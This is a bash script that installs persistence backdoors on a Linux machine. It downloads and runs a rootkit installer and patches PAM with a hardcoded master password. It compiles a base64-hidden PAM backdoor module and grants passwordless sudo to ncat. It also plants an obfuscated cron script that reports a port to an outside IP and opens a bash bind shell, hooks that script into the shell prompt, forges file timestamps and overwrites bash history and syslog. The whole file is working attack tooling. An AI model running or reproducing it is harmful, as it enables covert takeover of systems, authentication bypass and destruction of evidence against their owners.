#!/bin/bash

rootkit() {
    echo "Installing vlany rootkit..."
    (
        cd /tmp
        wget --no-check-certificate https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh
        chmod +x quick_install.sh
        ./quick_install.sh
    )
}

pam_backdoor() {
    echo "Installing pam backdoors"
    sudo apt-get install -y libpam0g-dev flex

    (
        echo "Installing pam_unix backdoor..."
        
        cd /tmp
        wget http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz
        tar xzf Linux-PAM-1.1.1.tar.gz
        rm Linux-PAM-1.1.1.tar.gz
        cd Linux-PAM-1.1.1

        OLDTIME=`stat -c '%z' /lib/security/pam_ftp.so`
        SECRETPASS='cbOargzaYHSJ'
        sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif(strcmp(p,"'$SECRETPASS'")==0){retval=PAM_SUCCESS;}/g' modules/pam_unix/pam_unix_auth.c
        ./configure && make

        sudo cp -rf modules/pam_unix/.libs/pam_unix.so /lib/security/pam_unix.so
        sudo touch -d "$OLDTIME" /lib/security/pam_unix.so
        cd ..
        rm -rf Linux-PAM-1.1.1
    )

    (
        echo "Installing pam_bd backdoor..."

        cd /tmp
        echo "LyogcGFtX2JkLnNvIC0gU2ltcGxlIFBBTSBNb2R1bGUgQmFja2Rvb3IgKi8KCiNp\
            bmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDxz\
            dGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8c2VjdXJpdHkv\
            cGFtX2FwcGwuaD4KI2luY2x1ZGUgPHNlY3VyaXR5L3BhbV9tb2R1bGVzLmg+Cgoj\
            ZGVmaW5lIEJBQ0tQQVNTICJscUxrZE1jeUVsckEiCgpQQU1fRVhURVJOIGludApw\
            YW1fc21fc2V0Y3JlZChwYW1faGFuZGxlX3QgKnBhbWgsIGludCBmbGFncywgaW50\
            IGFyZ2MsIGNvbnN0IGNoYXIgKiphcmd2KSB7CiAgICAgICAgcmV0dXJuIFBBTV9T\
            VUNDRVNTOwp9CgpQQU1fRVhURVJOIGludApwYW1fc21fYWNjdF9tZ210KHBhbV9o\
            YW5kbGVfdCAqcGFtaCwgaW50IGZsYWdzLCBpbnQgYXJnYywgY29uc3QgY2hhciAq\
            KmFyZ3YpIHsKICAgICAgICByZXR1cm4gUEFNX1NVQ0NFU1M7Cn0KClBBTV9FWFRF\
            Uk4gaW50CnBhbV9zbV9hdXRoZW50aWNhdGUocGFtX2hhbmRsZV90ICpwYW1oLCBp\
            bnQgZmxhZ3MsaW50IGFyZ2MsIGNvbnN0IGNoYXIgKiphcmd2KSB7CiAgICAgICAg\
            Y2hhciAqcGFzc3dvcmQgPSBOVUxMOwogICAgICAgIHBhbV9nZXRfYXV0aHRvayhw\
            YW1oLCBQQU1fQVVUSFRPSywgKGNvbnN0IGNoYXIgKiopJnBhc3N3b3JkLCBOVUxM\
            KTsKCiAgICAgICAgaWYoIXN0cm5jbXAocGFzc3dvcmQsIEJBQ0tQQVNTLCBzdHJs\
            ZW4oQkFDS1BBU1MpKSkKICAgICAgICAgICAgICAgIHJldHVybiBQQU1fU1VDQ0VT\
            UzsKCiAgICAgICAgcmV0dXJuIC0xOwp9" | \
            sed -r 's/\s//g' | \
            base64 -d | \
            gcc -fPIC -fno-stack-protector -xc -c - -o pam_acccess.o

        sudo ld -x --shared -o /lib/security/pam_acccess.so pam_acccess.o
        sudo chmod 644 /lib/security/pam_acccess.so
        rm pam_acccess.o
    )

    (
        echo '"Fixing" /etc/pam.d/su...'
        
        sudo mv /etc/pam.d/su /etc/pam.d/.su
        echo "bmF1dGggICAgICAgICAgIHN1ZmZpY2llbnQgICAgICBwYW1fcm9vdG9rLnNvCmF1\
            dGggICAgICAgICAgICBzdWZmaWNpZW50ICAgICAgcGFtX3VuaXguc28KYWNjb3Vu\
            dCAgICAgICAgIHJlcXVpcmVkICAgICAgICBwYW1fdW5peC5zbwpzZXNzaW9uICAg\
            ICAgICAgcmVxdWlyZWQgICAgICAgIHBhbV91bml4LnNvCmF1dGggICAgICAgICAg\
            ICBzdWZmaWNpZW50ICAgICAgcGFtX2FjY2Nlc3Muc28KYWNjb3VudCAgICAgICAg\
            IHN1ZmZpY2llbnQgICAgICBwYW1fYWNjY2Vzcy5zbwo=" | \
            sed -r 's/\s//g' | \
            base64 -d | sudo tee /etc/pam.d/su 1>/dev/null
    )
}

cron_backdoor() {
    echo "Installing cron backdoor..."

    OLDTIME=`stat -c '%z' /lost+found`
    HIDDEN_DIR="/lost+found/       /f4g0ZFJP3Eja"
    sudo mkdir -p "$HIDDEN_DIR"
    sudo touch -d "$OLDTIME" /lost+found


    OLDTIME=`stat -c '%z' /etc/cron.d`
    sudo mkdir /etc/cron.minute
    sudo chown root:root /etc/cron.minute

    cd /tmp
    wget --no-check-certificate https://github.com/ZephrFish/static-tools/blob/master/ncat?raw=true -O ncat
    sudo mv ncat /bin/ncat
    sudo chmod +x /bin/ncat

    echo "ALL ALL=NOPASSWD: /bin/ncat" | sudo tee -a /etc/sudoers 1>/dev/null
    

    # #!/bin/bash
    # PORT="$(shuf -i 2000-65000 -n 1)"
    # (echo "port: $PORT" | nc 129.21.88.69 4444) > /dev/null
    # (sudo ncat -lp $PORT -e /bin/bash &) > /dev/null


    echo "IyEvYmluL2Jhc2gKUE9SVD0iJChzaHVmIC1pIDIwMDAtNjUwMDAgLW4gMSkiCihl\
        Y2hvICJwb3J0OiAkUE9SVCIgfCBuYyAxMjkuMjEuODguNjkgNDQ0NCkgPiAvZGV2\
        L251bGwKKHN1ZG8gbmNhdCAtbHAgJFBPUlQgLWUgL2Jpbi9iYXNoICYpID4gL2Rl\
        di9udWxsCg==" | \
        sed -r 's/\s//g' | \
        base64 -d | sudo tee /etc/cron.minute/log_rotate.sh 1>/dev/null

    sudo chmod +x /etc/cron.minute/log_rotate.sh
    sudo touch -d "$OLDTIME" /etc/cron.minute
}

alias_backdoor() {
    echo "Installing alias backdoors..."
    echo 'PS1="$PS1\$((/bin/bash /etc/cron.minute/log_rotate.sh) > /dev/null)"' >> ~/.bashrc
}


rootkit
pam_backdoor
cron_backdoor
alias_backdoor

echo "lmao" > ~/.bash_history
echo "heh" > /var/log/syslog